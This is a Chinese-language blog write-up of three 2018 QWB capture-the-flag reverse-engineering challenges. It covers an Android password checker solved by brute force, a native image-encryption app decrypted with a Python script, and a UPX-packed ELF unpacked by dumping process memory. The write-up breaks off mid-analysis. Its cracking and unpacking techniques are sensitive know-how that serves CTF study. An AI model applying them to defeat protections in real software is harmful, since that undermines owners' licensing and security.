        <h2 id="simple-check"><a href="#simple-check" class="headerlink" title="simple check"></a>simple check</h2><h3 id="simple的mainactivity-kt分析"><a href="#simple的mainactivity-kt分析" class="headerlink" title="simple的mainactivity.kt分析"></a>simple的mainactivity.kt分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package com.a.simplecheck;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.support.v7.app.c;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.Toast;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>包名</strong>：<code>com.a.simplecheck</code>，表明这是一个简单的检查类应用</li>
<li><strong>导入语句</strong>：使用了Android Support库（v7），说明这是一个较老的项目</li>
</ul>
<p>这是一个<strong>密码验证程序</strong>，其工作流程为：</p>
<ol>
<li>用户在一个文本输入框（EditText）中输入内容</li>
<li>点击一个按钮进行验证</li>
<li>程序调用<code>a.a(String)</code>方法对输入进行验证</li>
<li>根据验证结果显示不同的Toast消息</li>
</ol>
<p>关键逆向分析点：</p>
<ol>
<li><strong>核心逻辑在类<code>a</code>的方法<code>a()</code>中</strong></li>
<li><strong>验证算法</strong>：<code>a.a(String input)</code>是验证的核心方法</li>
<li><strong>成功条件</strong>：当输入满足某种算法时返回<code>true</code></li>
</ol>
<h3 id="类a分析"><a href="#类a分析" class="headerlink" title="类a分析"></a>类a分析</h3><p>这个 <code>a</code> 类包含了验证flag的完整算法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class a &#123;</span><br><span class="line">    private static int[] a = &#123;0, 146527998, 205327308, ... , 864054312&#125;;</span><br><span class="line">    private static int[] b = &#123;13710, 46393, 49151, ... , 37108&#125;;</span><br><span class="line">    private static int[] c = &#123;38129, 57355, 22538, ... , 64666&#125;;</span><br><span class="line">    private static int[] d = &#123;0, -341994984, -370404060, ... , 276158562&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义了4个静态数组，包含预计算的常数</li>
<li>数组 <code>a</code> 有35个元素，<code>b</code>、<code>c</code>、<code>d</code> 各有34个元素</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static boolean a(String str) &#123;</span><br><span class="line">    if (str.length() != b.length) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>第一重检查</strong>：输入字符串长度必须等于数组 <code>b</code> 的长度（34个字符）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int[] iArr = new int[a.length];</span><br><span class="line">iArr[0] = 0;</span><br><span class="line">int i = 1;</span><br><span class="line">for (byte b2 : str.getBytes()) &#123;</span><br><span class="line">    iArr[i] = b2;</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>将输入字符串转换为ASCII码数组</li>
<li><code>iArr[0]</code> 被设为0，然后依次填充输入字符串的每个字符的ASCII值</li>
<li>最终 <code>iArr</code> 数组有35个元素（索引0到34）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (int i2 = 0; i2 &lt; c.length; i2++) &#123;</span><br><span class="line">    if (a[i2] != (b[i2] * iArr[i2] * iArr[i2]) + (c[i2] * iArr[i2]) + d[i2] </span><br><span class="line">        || a[i2 + 1] != (b[i2] * iArr[i2 + 1] * iArr[i2 + 1]) + (c[i2] * iArr[i2 + 1]) + d[i2]) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure>

<p>遍历34次，检查二次方程约束</p>
<p><strong>验证模型</strong></p>
<p>对于i从0到33，必须满足以下两个方程其中之一：</p>
<p>方程1：<br>$$<br>a[i] &#x3D; b[i] * (x_i)² + c[i] * x_i + d[i]<br>$$<br>方程2：<br>$$<br>a[i + 1] &#x3D; b[i] * (x_{i+1})² + c[i] * x_{i+1} + d[i]<br>$$</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>暴力破解就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]</span><br><span class="line">b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108]</span><br><span class="line">c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666]</span><br><span class="line">d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]</span><br><span class="line"></span><br><span class="line">result = [0]</span><br><span class="line"></span><br><span class="line">for i in range(34):</span><br><span class="line">    found = False</span><br><span class="line">    for char_code in range(32,127):</span><br><span class="line">        if a[i + 1] == b[i] * char_code * char_code + c[i] * char_code + d[i]:</span><br><span class="line">            result.append(char_code)</span><br><span class="line">            found = True</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">    if not found:</span><br><span class="line">        print(f&quot;在位置 &#123;i&#125; 找不到满足方程的字符&quot;)</span><br><span class="line">        break</span><br><span class="line">    </span><br><span class="line"># 将ASCII码转换为字符串</span><br><span class="line">flag = &#x27;&#x27;.join(chr(code) for code in result)</span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br><span class="line"></span><br><span class="line">#Flag: flag&#123;MAth_i&amp;_GOOd_DON7_90V_7hInK?&#125;</span><br></pre></td></tr></table></figure>



<p><strong>补充知识点</strong></p>
<p><strong>什么是 Toast？</strong></p>
<p><strong>Toast</strong> 是一个小的弹出消息框，它在屏幕底部短暂显示一段时间，然后自动消失。它用于向用户提供简单的反馈或提示信息。</p>
<h2 id="picture-lock"><a href="#picture-lock" class="headerlink" title="picture_lock"></a>picture_lock</h2><p>这是一个<strong>图片加密锁应用</strong>，主要功能是：</p>
<ol>
<li>选择手机中的图片文件</li>
<li>使用Native代码（C&#x2F;C++）对图片进行加密</li>
<li>将加密后的文件保存为<code>.lock</code>格式</li>
<li>显示已加密的文件列表</li>
</ol>
<p><strong>目标是将某个加密后的文件解密出来，flag 就在里面。</strong></p>
<h3 id="mainactivity分析"><a href="#mainactivity分析" class="headerlink" title="mainactivity分析"></a>mainactivity分析</h3><p>直接找到点击事件ENCRYPT按钮绑定的OnClick()方法:</p>
<p><img src="/image-20250826215213134.png" alt="image-20250826215213134"></p>
<p>可以看出，代码首先检查了文件读写的权限，然后打开了图片选择的界面，选择图片后，会调用方法onActivityResult()：</p>
<p><img src="/image-20250826215307964.png" alt="image-20250826215307964"></p>
<p>可以看到这里有3个方法被调用了，分别是enc()，j()，i()。</p>
<p><img src="/image-20250826215346430.png" alt="image-20250826215346430"></p>
<p>可以看出i()使用来显示文本框中的内容，对图片的处理没有影响</p>
<p><img src="/image-20250826215409020.png" alt="image-20250826215409020"></p>
<p>j()用于获取apk签名的MD5值</p>
<p><img src="/image-20250826215441073.png" alt="image-20250826215441073"></p>
<p>根据enc()方法的声明，可以知道，方法需要三个String类型的参数，这三个参数具体是什么，我们用动态调试的方法获取。</p>
<hr>
<h3 id="动态调试-so文件"><a href="#动态调试-so文件" class="headerlink" title="动态调试.so文件"></a>动态调试.so文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push &quot;%USERPROFILE%\Downloads\bootloader-bonito-b4s4-0.4-8048689.img&quot; /sdcard/Download/</span><br><span class="line">#查看文件列表</span><br><span class="line">adb shell ls -la /sdcard/Download/</span><br></pre></td></tr></table></figure>

<p>root： <a target="_blank" rel="noopener" href="https://sspai.com/post/76276">https://sspai.com/post/76276</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000 ; Options     : EF_ARM_SOFT_FLOAT</span><br><span class="line">LOAD:00000000 ; EABI version: 5</span><br><span class="line">LOAD:00000000 ;</span><br><span class="line">LOAD:00000000</span><br><span class="line">LOAD:00000000 ; Processor       : ARM</span><br><span class="line">LOAD:00000000 ; ARM architecture: ARMv7</span><br><span class="line">LOAD:00000000 ; Target assembler: Generic assembler for ARM</span><br><span class="line">LOAD:00000000 ; Byte sex        : Little endian</span><br><span class="line"></span><br><span class="line">LOAD:00000000 ; Segment type: Pure code</span><br><span class="line">LOAD:00000000                 AREA LOAD, CODE, ALIGN=12</span><br><span class="line">LOAD:00000000                 CODE32</span><br></pre></td></tr></table></figure>

<p><strong>IDA PRO连接调试应用</strong><br>(1)在IDA Pro的安装路径dbgsrv目录下找到android_server，放入真机的&#x2F;data&#x2F;local&#x2F;tmp路径下并赋权，以root身份运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb push android_server /data/local/tmp </span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod 755 android_server64</span><br><span class="line">./android_server64</span><br></pre></td></tr></table></figure>

<p><img src="/image-20250827095440764.png" alt="image-20250827095440764"></p>
<p>(2)转发窗口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946  </span><br></pre></td></tr></table></figure>

<p><img src="/image-20250827100132266.png" alt="image-20250827100132266"></p>
<p>打开ida32位</p>
<p>Deubugger-Attach-Remote ARM Linux&#x2F;Android debugger</p>
<p>查看libnative.so是否已经运行，打开enc()函数。下断点。</p>
<p><img src="/image-20250904101123407.png" alt="image-20250904101123407"></p>
<p>打开app-选择照片-手机黑屏-断到了</p>
<hr>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>静态看吧，主要就是这个enc()。native方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall Java_com_a_sample_picturelock_MainActivity_enc(int a1, int a2, int a3, int a4, int a5)</span><br><span class="line">&#123;</span><br><span class="line">  char *v8; // r4</span><br><span class="line">  int v9; // r6</span><br><span class="line">  const void *v10; // r11</span><br><span class="line"></span><br><span class="line">  v8 = (char *)(*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a3, 0);</span><br><span class="line">  v9 = (*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a4, 0);</span><br><span class="line">  if ( !dword_600C )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_600C = (int)malloc(0x20u);</span><br><span class="line">    v10 = (const void *)(*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a5, 0);</span><br><span class="line">    qmemcpy((void *)dword_600C, v10, 0x20u);</span><br><span class="line">    (*(void (__fastcall **)(int, int, const void *))(*(_DWORD *)a1 + 680))(a1, a5, v10);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1A48(v8);</span><br><span class="line">  (*(void (__fastcall **)(int, int, char *))(*(_DWORD *)a1 + 680))(a1, a3, v8);</span><br><span class="line">  return (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 680))(a1, a4, v9);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_1A48函数：一些加密算法</p>
<p>此函数是一个典型的<strong>文件加解密&#x2F;转换工具</strong>的核心逻辑，主要功能为：</p>
<ul>
<li><strong>初始化阶段</strong>：首次调用时生成内部状态（疑似密钥调度或预处理）。</li>
<li><strong>文件处理阶段</strong>：从输入文件 <code>filename</code> 读取数据 → 经复杂变换 → 写入输出文件 <code>a2</code></li>
</ul>
<p>基本流程：</p>
<ol>
<li>将传入的签名的 md5 字符串分为两半，生成两组密钥。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v5 = dword_600C;</span><br><span class="line">    for ( i = 0; i != 4; ++i )</span><br><span class="line">      v4[i] = _byteswap_ulong(*(_DWORD *)(v5 + i * 4));</span><br><span class="line">      </span><br><span class="line">v29 = &amp;dword_6008;</span><br><span class="line">if ( (v24 &amp; 1) == 0 )</span><br><span class="line">	v29 = &amp;dword_6004;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>每次读入 md5sig[k &amp; 0x1F] 大小的内容</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v24 = *(_BYTE *)(dword_600C + (k &amp; 0x1F));</span><br></pre></td></tr></table></figure>

<ul>
<li><code>k &amp; 0x1F</code> 等价于 <code>k % 32</code>，即循环使用 <code>dword_600C</code> 的前 32 字节作为每轮读取长度表。</li>
</ul>
<p><code>fread(v20, 1u, v24, v21)</code> 按此长度读取数据。</p>
<ol start="3">
<li>根据读入的大小决定使用哪一组密钥</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((v24 &amp; 1) == 0) v29 = &amp;dword_6004;</span><br></pre></td></tr></table></figure>

<ul>
<li>根据当前块长度 <code>v24</code> 的奇偶性选择 IV 基址（<code>dword_6004</code> 或 <code>dword_6008</code>）。</li>
</ul>
<ol start="4">
<li>奇数使用第二组密钥，偶数使用第一组密钥</li>
</ol>
<ul>
<li>当 <code>v24</code> 为奇数时，<code>(v24 &amp; 1) != 0</code>，默认使用 <code>dword_6008</code>；</li>
<li>当 <code>v24</code> 为偶数时，强制切换为 <code>dword_6004</code>。</li>
</ul>
<ol start="5">
<li>如果读入的大小不够 16 的话，就将后面填充为不够的大小（比如大小为 12 时，填充 4 个 0x4）</li>
</ol>
<ul>
<li><code>if (v25 &lt;= 0xF)</code> 触发填充逻辑；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memset(v27, (unsigned __int8)v28, 16 - (v26 &amp; 0xF));</span><br></pre></td></tr></table></figure>

<ul>
<li>填充值为 <code>v28 = 16 - (v26 &amp; 0xF)</code>，即填充长度本身。</li>
</ul>
<ol start="6">
<li>这时修改后的内容必然够 16 个字节，对前 16 个字节进行 AES 加密。对于后面的字节，将其与 md5sig[k &amp; 0x1F] 依次进行异或。</li>
</ol>
<ul>
<li><strong>前 16 字节</strong>：经过复杂的多轮变换（<code>sub_132C</code>, <code>sub_13B0</code> 等），最终写入 <code>v22</code> 的前 16 字节。</li>
<li><strong>后续字节</strong>：<code>if (v26 &gt;= 0x11)</code> 分支中，对超出 16 字节的部分执行 <code>v22[v31] = v20[v31] ^ (BYTE)(v32 + v31%32)</code>，即与 <code>dword_600C</code> 的循环值异或。</li>
</ul>
<p>使用keytool工具获取签名的 md5</p>
<p>android中关于keytool 错误：java.lang.Exception：密钥库文件不存在: 解决步骤_keytool 错误: java.lang.exception: 密钥库文件不存在: debug.k-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/y201314an/article/details/80994798">https://blog.csdn.net/y201314an/article/details/80994798</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#keytool -printcert -jarfile D:\CTF\2018reverse\picturelock\picturelock.apk</span><br><span class="line"></span><br><span class="line">签名者 #1:</span><br><span class="line"></span><br><span class="line">证书 #1：</span><br><span class="line">所有者: CN=a, OU=b, O=c, L=d, ST=e, C=ff</span><br><span class="line">发布者: CN=a, OU=b, O=c, L=d, ST=e, C=ff</span><br><span class="line">序列号: 5f4e6be1</span><br><span class="line">生效时间: Fri Sep 09 14:32:36 CST 2016, 失效时间: Tue Sep 03 14:32:36 CST 2041</span><br><span class="line">证书指纹:</span><br><span class="line">         SHA1: 48:E7:04:5E:E6:0D:9D:8A:25:7C:52:75:E3:65:06:09:A5:CC:A1:3E</span><br><span class="line">         SHA256: BA:12:C1:3F:D6:0E:0D:EF:17:AE:3A:EE:4E:6A:81:67:82:D0:36:7F:F0:2E:37:CC:AD:5D:6E:86:87:0C:8E:38</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展:</span><br><span class="line"></span><br><span class="line">#1: ObjectId: 2.5.29.14 Criticality=false</span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 71 A3 2A FB D3 F4 A9 A9   2A 74 3F 29 8E 67 8A EA  q.*.....*t?).g..</span><br><span class="line">0010: 3B DD 30 E3                                        ;.0.</span><br><span class="line">]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>获取md5需要openssl，太大了下不下来啊。</p>
<p>反正MD5:  F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import itertools</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">sig = b&#x27;f8c49056e4ccf9a11e090eaf471f418d&#x27;</span><br><span class="line"></span><br><span class="line">def decode_sig(payload):</span><br><span class="line">    ans = bytearray()  # 使用 bytearray 代替字符串</span><br><span class="line">    for i in range(len(payload)):</span><br><span class="line">        # 执行异或操作并直接追加字节</span><br><span class="line">        ans.append(payload[i] ^ sig[(16 + i) % 32])</span><br><span class="line">    return bytes(ans)  # 转换为不可变 bytes 类型</span><br><span class="line"></span><br><span class="line">def dec_aes():</span><br><span class="line">    with open(&#x27;flag.jpg.lock&#x27;, &#x27;rb&#x27;) as data_file:</span><br><span class="line">        data = data_file.read()</span><br><span class="line">    </span><br><span class="line">    with open(&#x27;flag.jpg&#x27;, &#x27;wb&#x27;) as f:  # 确保文件以二进制模式打开</span><br><span class="line">        idx = 0</span><br><span class="line">        i = 0</span><br><span class="line">        cipher1 = AES.new(sig[:0x10], AES.MODE_ECB)</span><br><span class="line">        cipher2 = AES.new(sig[0x10:], AES.MODE_ECB)</span><br><span class="line">        </span><br><span class="line">        while idx &lt; len(data):</span><br><span class="line">            read_len = sig[i % 32]</span><br><span class="line">            payload = data[idx:idx + read_len]</span><br><span class="line">            print(f&#x27;[+] Totally &#123;idx&#125; / &#123;len(data)&#125; bytes, sig index : &#123;i&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">            if read_len % 2 == 0:</span><br><span class="line">                f.write(cipher1.decrypt(payload[:0x10]))</span><br><span class="line">            else:</span><br><span class="line">                f.write(cipher2.decrypt(payload[:0x10]))</span><br><span class="line">            </span><br><span class="line">            # 关键修改：decode_sig 现在返回 bytes，可直接写入二进制文件</span><br><span class="line">            f.write(decode_sig(payload[16:]))</span><br><span class="line">            f.flush()</span><br><span class="line">            idx += read_len</span><br><span class="line">            i += 1</span><br><span class="line">        print(&#x27;[+] Decoding done ...&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    dec_aes()</span><br></pre></td></tr></table></figure>

<p>得到解密出来的flag.jpg</p>
<style>.sotarfjnlfev{zoom: 33%;}</style><img src="/2023/08/16/qwb2018-re/flag.jpg" class="sotarfjnlfev" alt="flag">

<h3 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a><strong>补充知识点</strong></h3><p>smali</p>
<p>smali是andriod虚拟机的反汇编语言</p>
<p>openssl x509 -noout -modulus -in client.crt | openssl md5<br>openssl rsa -noout -modulus -in client.key | openssl md5</p>
<h2 id="hide"><a href="#hide" class="headerlink" title="hide"></a>hide</h2><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-251371.htm">原创]从2018强网杯hide题中学习手动脱壳与算法识别的思路-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p>先查壳，稍微折腾了一下，PEiD查不到壳，选择使用strings命令。windows下没有strings，下载git，git也不能用，最终选择MSYS2。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syu</span><br><span class="line">pacman -S mingw-w64-x86_64-binutils</span><br><span class="line">cd /d/CTF/2018reverse/hide</span><br><span class="line">strings hide | grep -i upx</span><br></pre></td></tr></table></figure>

<p>查看结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ strings hide | grep -i upx</span><br><span class="line">UPX!</span><br><span class="line">$Info: This file is packed with the UPX executable packer http://upx.sf.net $</span><br><span class="line">$Id: UPX 3.91 Copyright (C) 1996-2013 the UPX Team. All Rights Reserved. $</span><br><span class="line">UPX!</span><br><span class="line">UPX!</span><br></pre></td></tr></table></figure>

<p>这个文件 <strong><code>hide</code></strong> 使用了 <strong>UPX 3.91</strong> 版本进行加壳压缩。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS D:\CTF\2018reverse\hide&gt; upx -d hide</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2025</span><br><span class="line">UPX 5.0.2       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jul 20th 2025</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">upx: hide: CantUnpackException: unknown format 0</span><br><span class="line"></span><br><span class="line">Unpacked 0 files.</span><br></pre></td></tr></table></figure>

<p>需要手动脱壳，使用file命令查看文件信息，是个Linux文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file hide</span><br><span class="line">hide: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</span><br></pre></td></tr></table></figure>

<p>具体做法是让程序先运行，然后等到数据自动解压&#x2F;解密出来后，再dump内存组成elf文件进行分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;./hide</span><br><span class="line">&gt; pgrep -fl hide</span><br><span class="line">&gt; pmap -d 21895</span><br><span class="line">&gt; dd if=/proc/$(pidof hide)/mem of=hide_dump1 skip=4194304  bs=1c count=827392</span><br><span class="line"></span><br><span class="line">&gt; file hide_dump1</span><br><span class="line">hide_dump1: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, missing section headers at 840568</span><br><span class="line"></span><br><span class="line">&gt; dd if=/proc/$(pidof hide)/mem of=hide_dump2 skip=7110656 bs=1 count=20480</span><br><span class="line">&gt; cat hide_dump1 hide_dump2 &gt; hide_dump</span><br><span class="line"></span><br><span class="line">&gt; file hide_dump</span><br><span class="line">hide_dump: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped</span><br></pre></td></tr></table></figure>

<p>然后就获得了完整的脱壳后的文件。</p>
<p>静态分析</p>
<p>将<code>hide_dump</code>载入ida，按下<code>Shift</code>+<code>F12</code>查看字符串列表并搜索<code>flag</code>:</p>
<p><img src="/image-20250911155632129.png" alt="image-20250911155632129"></p>
<p>敏感字符串aYouAreRight，查看交叉引用：</p>
<p><img src="/image-20250911155911810.png" alt="image-20250911155911810"></p>
<p>查看sub_4009EF函数：</p>
<p><img src="/image-20250911161638344.png" alt="image-20250911161638344"></p>
<p>这肯定不对，看下一个函数：</p>
<p><img src="/image-20250911201625976.png" alt="image-20250911201625976"></p>
<p>进入这个地址，发现ida没有将其识别称为一个函数，我们需要手动逆向分析。这通常发生在加壳、混淆或编译器优化过的代码中。</p>
<h3 id="逆向工程中的手动分析操作"><a href="#逆向工程中的手动分析操作" class="headerlink" title="逆向工程中的手动分析操作"></a><strong>逆向工程中的手动分析操作</strong></h3><p>反编译之后跟题解不一样</p>
<p>向上查看代码，寻找合适的函数起点</p>
<p><code>0x4C8EF4</code> 这个位置具有函数开头的典型特征（如ret或jmp后面基本就是一个函数的开头）</p>
<p>使用 <strong>Create Function</strong> 功能强制 IDA 将该地址识别为函数开头</p>
<p>这是个先验证后加密的函数：</p>
